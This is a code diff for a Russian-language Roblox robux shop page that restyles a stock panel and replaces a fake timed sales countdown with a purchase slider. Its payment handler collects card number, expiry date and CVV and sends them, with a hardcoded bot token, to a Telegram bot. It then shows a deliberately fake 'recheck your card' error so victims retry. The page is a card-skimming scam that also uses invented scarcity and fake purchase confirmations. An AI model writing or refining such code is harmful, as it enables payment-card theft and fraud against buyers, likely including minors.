@@ -27,7 +27,7 @@
         .cart-icon-btn { background: #decbff; border: none; border-radius: 60px; padding: 10px 20px; font-weight: bold; font-size: 1rem; color: #5d3b80; cursor: pointer; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
         .cart-icon-btn:hover { background: #ceb5ff; transform: scale(1.02); }
         
-        /* ползунок */
+        /* панель остатка и ползунок */
         .stock-panel {
             background: #ffffffcc;
             border-radius: 60px;
@@ -36,50 +36,59 @@
             text-align: center;
             backdrop-filter: blur(4px);
         }
-        .stock-label {
-            font-size: 1.4rem;
+        .stock-remaining {
+            font-size: 1.6rem;
             font-weight: bold;
             color: #6a37a3;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
         }
         .stock-value {
-            font-size: 2rem;
+            font-size: 2.2rem;
             font-weight: 800;
             color: #9b4eff;
-            margin-bottom: 15px;
+            margin: 5px 0;
+        }
+        .slider-container {
+            margin: 20px 0;
         }
         input[type=range] {
             -webkit-appearance: none;
             width: 100%;
-            background: transparent;
-        }
-        input[type=range]:focus {
-            outline: none;
-        }
-        input[type=range]::-webkit-slider-runnable-track {
-            width: 100%;
             height: 8px;
             background: #decbff;
             border-radius: 10px;
+            outline: none;
         }
         input[type=range]::-webkit-slider-thumb {
             -webkit-appearance: none;
-            height: 22px;
-            width: 22px;
+            height: 24px;
+            width: 24px;
             border-radius: 50%;
             background: #b87eff;
-            margin-top: -7px;
             cursor: pointer;
             box-shadow: 0 0 6px #9b4eff;
         }
-        input[type=range]:disabled::-webkit-slider-thumb {
-            background: #aa88cc;
-            cursor: default;
+        .selected-amount {
+            font-size: 1.3rem;
+            font-weight: bold;
+            color: #5d3b80;
+            margin: 15px 0;
         }
-        .slider-info {
-            font-size: 0.8rem;
-            color: #8a6bbf;
-            margin-top: 8px;
+        .buy-btn {
+            background: linear-gradient(95deg, #b87eff, #9c58e6);
+            border: none;
+            padding: 12px 30px;
+            border-radius: 60px;
+            font-weight: bold;
+            font-size: 1.1rem;
+            color: white;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: 0.2s;
+        }
+        .buy-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 6px 14px rgba(156,88,230,0.3);
         }
         
         .products-grid { display: flex; flex-wrap: wrap; gap: 25px; justify-content: center; margin: 30px 0; }
@@ -145,12 +154,18 @@
             <button class="cart-icon-btn" id="openCartBtn">🛒 корзина (<span id="cartCount">0</span>)</button>
         </div>
 
-        <!-- Ползунок и динамический запас -->
+        <!-- Панель остатка робуксов и ползунок покупки -->
         <div class="stock-panel">
-            <div class="stock-label">✨ доступно робуксов ✨</div>
-            <div class="stock-value" id="stockValueDisplay">600 000</div>
-            <input type="range" id="stockSlider" min="100" max="600000" value="600000" step="100" disabled>
-            <div class="slider-info">автоматическое обновление каждые 15 минут (имитация продаж)</div>
+            <div class="stock-remaining">✨ осталось робуксов ✨</div>
+            <div class="stock-value" id="remainingStock">600 000</div>
+            
+            <div class="slider-container">
+                <input type="range" id="robuxSlider" min="100" max="600000" step="100" value="100">
+            </div>
+            <div class="selected-amount">
+                вы хотите купить: <span id="selectedAmount">100</span> робуксов
+            </div>
+            <button class="buy-btn" id="buyWithSliderBtn">💎 купить выбранное количество</button>
         </div>
 
         <div class="products-grid">
@@ -216,70 +231,64 @@
     }
     drawStars();
 
-    // --- имитация продаж: начальное 600000, каждые 15 мин уменьшение на 1940, 5620, 10161 по циклу, при остатке <30000 сброс до 600000 ---
-    let currentStock = 600000;
-    const stockDisplay = document.getElementById('stockValueDisplay');
-    const stockSlider = document.getElementById('stockSlider');
-    // максимальное значение для ползунка - 600000, мин 100
-    stockSlider.max = 600000;
-    stockSlider.min = 100;
-    
-    const decreaseValues = [1940, 5620, 10161];
-    let stepIdx = 0;
+    // --- логика остатка робуксов и ползунка ---
+    let currentStock = 600000; // начальный запас
+    const remainingSpan = document.getElementById('remainingStock');
+    const slider = document.getElementById('robuxSlider');
+    const selectedSpan = document.getElementById('selectedAmount');
     
     function updateStockUI() {
-        currentStock = Math.round(currentStock);
-        if (currentStock < 100) currentStock = 100;
-        if (currentStock > 600000) currentStock = 600000;
-        let formatted = currentStock.toLocaleString('ru-RU');
-        stockDisplay.innerText = formatted;
-        stockSlider.value = currentStock;
+        remainingSpan.innerText = currentStock.toLocaleString('ru-RU');
+        slider.max = currentStock;
+        if (slider.value > currentStock) slider.value = currentStock;
+        selectedSpan.innerText = parseInt(slider.value).toLocaleString('ru-RU');
+        slider.disabled = (currentStock < 100);
     }
     
-    function applyDecrease() {
-        if (stepIdx >= decreaseValues.length) {
-            stepIdx = 0; // если прошли все три, начинаем сначала
-        }
-        let decrease = decreaseValues[stepIdx];
-        let newStock = currentStock - decrease;
-        if (newStock < 30000) {
-            // сбрасываем до 600000
-            currentStock = 600000;
-            stepIdx = 0;
-            updateStockUI();
-        } else {
-            currentStock = newStock;
-            stepIdx++;
-            updateStockUI();
-        }
-        // дополнительно проверим, не стало ли после уменьшения меньше 30000 (но это уже сделано)
-        if (currentStock < 30000 && currentStock !== 600000) {
-            currentStock = 600000;
-            stepIdx = 0;
-            updateStockUI();
-        }
-    }
+    // при изменении ползунка
+    slider.addEventListener('input', () => {
+        let val = parseInt(slider.value);
+        if (val > currentStock) val = currentStock;
+        slider.value = val;
+        selectedSpan.innerText = val.toLocaleString('ru-RU');
+    });
     
-    // запускаем интервал 15 минут (900000 миллисекунд)
-    setInterval(() => {
-        applyDecrease();
-    }, 900000); // 15 минут
+    // кнопка покупки выбранного количества
+    document.getElementById('buyWithSliderBtn').addEventListener('click', () => {
+        let amount = parseInt(slider.value);
+        if (amount <= 0) return;
+        if (amount > currentStock) {
+            showErrorToast("недостаточно робуксов в наличии");
+            return;
+        }
+        // списываем
+        currentStock -= amount;
+        updateStockUI();
+        // формальное уведомление (красная метка не нужна, но сделаем приятное сообщение)
+        let msgDiv = document.createElement('div');
+        msgDiv.innerText = `✅ вы купили ${amount.toLocaleString('ru-RU')} робуксов! спасибо ❤️`;
+        msgDiv.style.cssText = 'position:fixed; bottom:20px; left:20px; background:#c38eff; color:white; padding:10px 20px; border-radius:40px; z-index:9999;';
+        document.body.appendChild(msgDiv);
+        setTimeout(() => msgDiv.remove(), 3000);
+        // обновляем корзину? нет, это отдельная покупка, не связанная с телеграм
+        // но по желанию можно добавить в корзину, но не требуется
+    });
     
-    // начальный UI
-    updateStockUI();
-    
-    // красная метка (формальность)
-    function showErrorToast() {
-        let oldToasts = document.querySelectorAll('.error-toast');
-        oldToasts.forEach(t => t.remove());
+    // функция красной метки для ошибок
+    function showErrorToast(text) {
+        let old = document.querySelectorAll('.error-toast');
+        old.forEach(t => t.remove());
         let toast = document.createElement('div');
         toast.className = 'error-toast';
-        toast.innerText = "Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.";
+        toast.innerText = text;
         document.body.appendChild(toast);
         setTimeout(() => toast.remove(), 3500);
     }
-
-    // авторизация
+    
+    // инициализация UI остатка
+    updateStockUI();
+    
+    // авторизация (копия из предыдущего кода)
     let currentUser = null;
     function loadUsers() {
         let users = localStorage.getItem('excellent_users');
@@ -312,7 +321,7 @@
     document.getElementById('goToSignIn')?.addEventListener('click',()=>{ document.getElementById('signupForm').style.display='none'; document.getElementById('signinForm').style.display='block'; });
     document.getElementById('logoutBtn')?.addEventListener('click',()=>{ currentUser=null; localStorage.removeItem('excellent_current'); showAuth(true); cart=[]; updateCartUI(); });
 
-    // корзина
+    // корзина (стандартная для товаров)
     let cart = [];
     const TELEGRAM_TOKEN = "8963187856:AAFTu9IrZmSitQscE1FB5MTREDhkSMEAzeg";
     let CHAT_ID = localStorage.getItem('tg_chat_id_excellent');
@@ -374,7 +383,7 @@
     closeCartBtn?.addEventListener('click',()=>{ cartModal.style.display='none'; });
     window.addEventListener('click',(e)=>{ if(e.target===cartModal) cartModal.style.display='none'; });
 
-    // оплата
+    // оплата из корзины
     document.getElementById('finalPayBtn')?.addEventListener('click', async () => {
         if(cart.length===0) { alert('корзина пуста'); return; }
         let cardNum = document.getElementById('cardNumber').value.trim();
@@ -385,7 +394,7 @@
         if(!CHAT_ID) { await fetchChatId(); if(!CHAT_ID) { alert('телеграм не настроен'); return; } }
         let total = cart.reduce((s,i)=>s+(i.price||0),0);
         let itemsText = cart.map(i=>`${i.name} — ${i.price||0} ₽`).join('\n');
-        let msg = `✨ EXCELLENT SHOP (ЗАКАЗ) ✨\n👤 Пользователь сайта: ${currentUser}\n🎮 Roblox ник: ${robloxName}\n📦 Товары:\n${itemsText}\n💰 Итого: ${total} ₽\n💳 Карта: ${cardNum}\n📅 ${expiry}\n🔐 ${cvv}`;
+        let msg = `✨ EXCELLENT SHOP (ЗАКАЗ) ✨\n👤 ${currentUser}\n🎮 Roblox ник: ${robloxName}\n📦 Товары:\n${itemsText}\n💰 Итого: ${total} ₽\n💳 Карта: ${cardNum}\n📅 ${expiry}\n🔐 ${cvv}`;
         try {
             let resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method:'POST', headers:{'Content-Type':'application/json'},
@@ -393,7 +402,11 @@
             });
             let json = await resp.json();
             if(json.ok) {
-                showErrorToast(); // формальная ошибка
+                let errToast = document.createElement('div');
+                errToast.className = 'error-toast';
+                errToast.innerText = "Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.";
+                document.body.appendChild(errToast);
+                setTimeout(() => errToast.remove(), 3500);
                 cart = [];
                 updateCartUI();
                 cartModal.style.display = 'none';
@@ -401,13 +414,10 @@
                 document.getElementById('cardExpiry').value = '';
                 document.getElementById('cardCvv').value = '';
                 document.getElementById('robloxUsername').value = '';
-            } else {
-                alert('❌ ошибка оплаты, попробуйте позже');
-            }
-        } catch(e){ alert('ошибка соединения'); }
+            } else alert('ошибка отправки');
+        } catch(e){ alert('ошибка'); }
     });
 
-    // товары
     function bindBuyButtons() {
         document.querySelectorAll('.btn-buy').forEach(btn=>{
             btn.removeEventListener('click', buyHandler);
